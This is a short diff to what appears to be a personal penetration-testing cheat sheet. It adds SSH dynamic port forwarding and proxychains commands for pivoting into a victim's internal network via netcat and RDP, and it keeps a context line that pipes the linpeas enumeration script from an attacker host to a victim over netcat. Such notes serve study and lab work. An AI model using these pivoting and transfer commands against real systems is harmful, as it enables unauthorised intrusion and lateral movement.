@@ -40,3 +40,17 @@ ssh username@victim-ip "nc attacker-ip port > linpeas.sh"
 ssh username@ip -p2222
 ```
 
+```
+ssh -D 9050 victimUsername@victimIP
+
+netstat -antup 9050
+
+sudo nano /etc/proxychains4.conf
+
+sudo proxychains nc -nv $victim'sInternalIP 80/445
+
+sudo proxychains rdesktop $victimIP
+```
+
+![](Pasted%20image%2020231030122335.png)
+
